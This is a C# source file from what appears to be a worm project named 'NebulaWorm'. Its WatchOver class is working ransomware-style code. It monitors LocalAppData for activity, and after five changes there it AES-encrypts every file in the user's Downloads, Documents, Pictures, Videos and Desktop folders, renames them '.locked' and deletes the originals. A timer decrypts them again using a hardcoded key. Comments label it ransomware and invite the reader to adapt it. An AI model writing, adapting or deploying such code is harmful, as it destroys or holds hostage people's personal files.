using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace NebulaWorm
{
    public static class WatchOver
    {
        private static readonly string tempCountFile = Path.Combine(Path.GetTempPath(), "watcherCount.txt");
        private static int tamperCount = 0;
        private static readonly object lockObj = new object();

        private static FileSystemWatcher watcher;
        private static Timer decryptTimer;

        // Encryption key and Iv
        private static readonly byte[] aesKey = Encoding.UTF8.GetBytes("1234567890123456"); // 16 byte key change if u want it Secure
        private static readonly byte[] aesIV = Encoding.UTF8.GetBytes("6543210987654321"); // 16 byte IV change if u want it Secure

        // Folder to watch for tampering (LocalAppData)
        private static readonly string watchFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        // Folders to encrypt/decrypt
        private static readonly string[] encryptFolders = new string[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        };

        public static void Start()
        {
            LoadTamperCount();

            watcher = new FileSystemWatcher
            {
                Path = watchFolder,
                IncludeSubdirectories = true,
                NotifyFilter = NotifyFilters.FileName | NotifyFilters.LastWrite | NotifyFilters.Size
            };

            watcher.Changed += OnChangedOrDeleted;
            watcher.Created += OnChangedOrDeleted;
            watcher.Deleted += OnChangedOrDeleted;
            watcher.Renamed += OnRenamed;

            watcher.EnableRaisingEvents = true;

            // Trigger decryption every 10 minutes and reset tamper count
            decryptTimer = new Timer(state =>
            {
                DecryptFolders();
                ResetTamperCount();
            }, null, TimeSpan.FromMinutes(10), TimeSpan.FromMinutes(10));
        }

        private static void OnChangedOrDeleted(object sender, FileSystemEventArgs e)
        {
            if (IsTampering(e.FullPath))
            {
                IncrementTamperCount();
            }
        }

        private static void OnRenamed(object sender, RenamedEventArgs e)
        {
            if (IsTampering(e.FullPath))
            {
                IncrementTamperCount();
            }
        }

        private static bool IsTampering(string filePath)
        {
            // Ignore files outside the watch folder
            if (!filePath.StartsWith(watchFolder, StringComparison.OrdinalIgnoreCase))
                return false;

            // Additional checks can be added here based on tampering criteria
            return true;
        }

        private static void IncrementTamperCount()
        {
            lock (lockObj)
            {
                tamperCount++;
                SaveTamperCount();

                if (tamperCount >= 5)
                {
                    // Trigger ransomware encryption
                    EncryptFolders();
                }
            }
        }

        private static void LoadTamperCount()
        {
            try
            {
                if (File.Exists(tempCountFile))
                {
                    var txt = File.ReadAllText(tempCountFile);
                    if (int.TryParse(txt, out int count))
                    {
                        tamperCount = count;
                    }
                }
            }
            catch
            {
                tamperCount = 0;
            }
        }

        private static void SaveTamperCount()
        {
            try
            {
                File.WriteAllText(tempCountFile, tamperCount.ToString());
            }
            catch
            {
            }
        }

        private static void ResetTamperCount()
        {
            lock (lockObj)
            {
                tamperCount = 0;
                SaveTamperCount();
            }
        }

        private static void EncryptFolders()
        {
            foreach (var folder in encryptFolders)
            {
                if (Directory.Exists(folder))
                {
                    EncryptDirectory(folder);
                }
            }
        }

        private static void DecryptFolders()
        {
            foreach (var folder in encryptFolders)
            {
                if (Directory.Exists(folder))
                {
                    DecryptDirectory(folder);
                }
            }
        }

        private static void EncryptDirectory(string folder)
        {
            try
            {
                var files = Directory.GetFiles(folder, "*.*", SearchOption.AllDirectories);
                foreach (var file in files)
                {
                    if (!file.EndsWith(".locked"))
                    {
                        EncryptFile(file);
                    }
                }
            }
            catch
            {
            }
        }

        private static void DecryptDirectory(string folder)
        {
            try
            {
                var files = Directory.GetFiles(folder, "*.locked", SearchOption.AllDirectories);
                foreach (var file in files)
                {
                    DecryptFile(file);
                }
            }
            catch
            {
            }
        }

        private static void EncryptFile(string file)
        {
            try
            {
                if (file.EndsWith(".locked"))
                    return; // Skip already encrypted files

                byte[] data = File.ReadAllBytes(file);
                byte[] encrypted = AesEncrypt(data, aesKey, aesIV);
                string newFile = file + ".locked";
                File.WriteAllBytes(newFile, encrypted);
                File.Delete(file);
            }
            catch
            {
            }
        }

        private static void DecryptFile(string file)
        {
            try
            {
                byte[] data = File.ReadAllBytes(file);
                byte[] decrypted = AesDecrypt(data, aesKey, aesIV);
                string originalFile = file.Substring(0, file.Length - 7); // remove ".locked" extension when decrypting
                File.WriteAllBytes(originalFile, decrypted);
                File.Delete(file);
            }
            catch
            {
            }
        }

        private static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = new AesManaged())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor())
                {
                    return encryptor.TransformFinalBlock(data, 0, data.Length);
                }
            }
        }

        private static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = new AesManaged())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(data, 0, data.Length);
                }
            }
        }
    }
}
